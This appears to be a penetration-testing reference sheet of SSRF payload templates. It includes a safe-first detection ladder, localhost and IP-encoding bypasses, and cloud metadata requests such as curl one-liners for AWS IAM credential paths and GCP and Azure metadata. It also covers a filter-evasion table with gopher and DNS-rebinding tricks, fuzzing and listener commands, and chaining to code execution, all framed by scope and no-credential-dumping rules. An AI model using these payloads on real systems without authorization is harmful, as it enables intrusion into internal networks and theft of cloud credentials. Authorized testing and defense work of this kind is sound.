# Payloads & Templates — SSRF

All payloads are templates with `<PLACEHOLDER>` slots. Fill them for the
specific engagement; never paste live third-party targets. The ladder here
is ordered by risk — climb only as far as authorization and impact proof
require, and scan only in-scope ranges.

## 0. Safe-first detection ladder

**Rule: the first signal is always an out-of-band callback to a domain or
collaborator you control.** Climb in this order and stop as soon as you have
two independent signals:

1. **OOB DNS/HTTP callback** — zero impact, proves server-side fetch. Use a
   unique path/token per test (`/ssrf-001`, `<TOKEN>`) so delayed or
   duplicate hits are attributable. Check the source: the app's egress
   IP/ASN with a non-browser UA = server-side; your own IP/browser UA =
   client-side, not SSRF.
2. **Error/timing differentials** — distinguishable failures (DNS-fail vs
   connection-refused vs HTTP 500) and open/refused/filtered timing bands
   with a control port and two samples each.
3. **Internal content marker** — one hostname/banner from an internal
   address, reflected in the response or embedded in a returned artifact.
4. **Cloud identity** — role *name*, service-account email, VM ID.
5. **Impact ceiling for production** — the rungs reached, one internal
   hostname, the role name. Stop. Do not dump credentials, do not read
   internal user data, do not write to internal services.

Collaborator setup (templates):

```bash
# interactsh — OOB DNS + HTTP with full request logging
interactsh-client -v                      # note your <OOB_DOMAIN>

# Burp: Collaborator tab → "Copy to file" then poll
# HTTP callback logger with header/UA logging (fingerprint the fetcher)
python3 -m http.server 8000               # basic; a custom logger is better
# DNS-only probe when HTTP egress is filtered:
nslookup <PLACEHOLDER_OOB_DOMAIN>.<TOKEN> <YOUR_NS>
```

## 1. SSRF probing ladder

Climb in order; stop at the highest rung that proves impact. Scan only
in-scope ranges — never mass-scan third-party space.

**Rung 1 — confirm server-side fetch (collaborator):**

```
GET /api/fetch?url=http://<PLACEHOLDER_OOB_DOMAIN>/ssrf-001
```

Log the source IP/ASN and fetcher UA (Go-http-client, python-requests...) —
that fingerprint feeds V-05/V-06 choices.

**Rung 2 — localhost:** `http://127.0.0.1/`, `http://localhost/`,
`http://[::1]/`, `http://0.0.0.0/`, `http://0/`, `http://127.1/`,
`http://2130706433/` (decimal), `http://0x7f000001/` (hex),
`http://0177.0.0.1/` (octal), `http://[::ffff:127.0.0.1]/`

**Rung 3 — loopback aliases (DNS-based, no encoding needed):**
`http://localtest.me/`, `http://lvh.me/`, `http://vcap.me/`,
`http://127.0.0.1.nip.io/`, `http://localhost.localtest.me/`

**Rung 4 — link-local / cloud metadata** (see the identity rule below):

```
AWS IMDSv1:  GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS IMDSv2:  PUT http://169.254.169.254/latest/api/token
             Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
             then GET .../latest/meta-data/ with X-aws-ec2-metadata-token: <TOKEN>
GCP:         GET http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
             Header (required): Metadata-Flavor: Google
             (also try http://metadata.google.internal/... for DNS-level proof)
Azure:       GET http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01
             Header (required): Metadata: true
Alibaba:     GET http://100.100.100.200/latest/meta-data/ram/security-credentials/
ECS (AWS):   GET http://169.254.170.2/v2/metadata/   (task metadata; identity fields only)
K8s:         GET http://10.96.0.1:443/  (API reachability only; token use = chain with
             info-disclosure/path-traversal skills, lab depth)
```

> **Identity rule:** cloud metadata access is proven by identifying the role,
> service-account email, VM ID, or task — **not by dumping credentials**. Fetch
> the role *name*, the instance identity document, the service-account email,
> then stop. Do not retrieve, screenshot, or retain credential JSON/tokens;
> redact anything token-like from report evidence.

**Rung 5 — internal ranges (in-scope only):** `10.0.0.0/8`,
`172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `100.64.0.0/10` (CGNAT),
`172.17.0.1` (docker bridge), `10.96.0.0/12` (k8s services). Differentials:
open port → fast/app-level response vs closed → fast TCP-refuse vs filtered →
slow timeout. Two timing samples per port, plus a control.

Curl one-liners for authorized/lab use:

```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/   # role name only
TOKEN=$(curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' \
  http://169.254.169.254/latest/api/token)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/          # role name only
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
```

## 2. Filter-bypass & evasion tricks

| Trick | Example | Bypasses |
|---|---|---|
| Parser differential (userinfo) | `http://allowed.tld@127.0.0.1/` | Allowlists checking authority incorrectly |
| Parser differential (fragment) | `http://allowed.tld#@127.0.0.1/` | Naive URL parsers |
| Redirect pivot | your box 302s to internal after passing the check | Filters validating only the initial URL |
| IPv6 encoding | `http://[::ffff:7f00:1]/` | IPv4-only denylists |
| Loopback DNS names | `localtest.me`, `127.0.0.1.nip.io` | Literal-IP blocklists (these are V-01 rungs, *not* rebinding) |
| Decimal/hex/octal IP | `2130706433`, `0x7f000001`, `0177.0.0.1` | Regex denylists on `127.` |
| Scheme case flip | `GoPher://`, `FILE://` | Case-sensitive scheme filters |
| Encoded newline (gopher) | `gopher://<HOST>:<PORT>/_%0d%0a` | HTTP verb/header control via raw bytes |
| Double URL-encode | `%252f` | Double-decoding pipelines |
| DNS rebinding | TTL-0 alternating A records | Resolve-then-fetch TOCTOU (own variant V-04) |

Honesty note: overlong UTF-8 and null-byte tricks are dead on modern stacks —
test once, don't build a report on them.

## 3. Tool invocation templates

```bash
# Param discovery for URL-fetch sinks
ffuf -u 'https://<TARGET>/api/fetch?param=FUZZ' -w params.txt -mr 'example' -t 30

# OOB hit confirmation with attribution
curl -s "https://<TARGET>/api/fetch?url=http%3a%2f%2f<TOKEN>.<OOB_DOMAIN>%2fssrf-001"

# Callback listener during labs (logs source IP + UA = fetcher fingerprint)
nc -lvnp 9999

# DNS rebinding automation
# own authoritative NS with TTL-0 alternating A records, or a rebinding
# service; probe order: public→127.0.0.1, then public→169.254.169.254
dig +short yourdomain.tld @<YOUR_NS>        # verify alternation is live

# Timing-differential port mapping (in-scope only, slow pacing, 2 samples + control)
curl -s -o /dev/null -w '%{time_total}\n' --max-time 5 http://<INTERNAL_HOST>:<PORT>/
```

## 4. Chain it with

- **`rce-testing`** — SSRF is the delivery, code execution is the payload:
  gopher'd writes to internal services, config-override endpoints reached
  internally, or a fetcher that shells out with the URL. Report the chain;
  execution framing belongs there.
- **`path-traversal-testing`** — `file://` reads and `php://`/wrapper chains
  are traversal-class primitives reached through a URL param; LFI detail
  lives there.
- **`info-disclosure-testing`** — feed the SSRF target list: leaked `.env`
  files, sourcemaps revealing sink code, stack traces naming internal hosts,
  bucket/registry URLs, and metadata role names observed in docs. Redact any
  secrets you find — report the leak class, don't hoard the material.
- **`business-logic-testing`** — webhook configuration flows and
  OAuth `redirect_uri`/`jku`-style URL controls are where SSRF-shaped
  sinks usually hide behind multi-step logic.
- **`csrf-testing`** — CSRF on an admin webhook/URL field turns *their*
  session into your SSRF trigger (blind, but real).
- Suite neighbors: `bac-idor-testing` (reaching fetch endpoints owned by
  other tenants), `xss-testing` (SSRF-to-local-preview-service rendering
  attacker HTML).
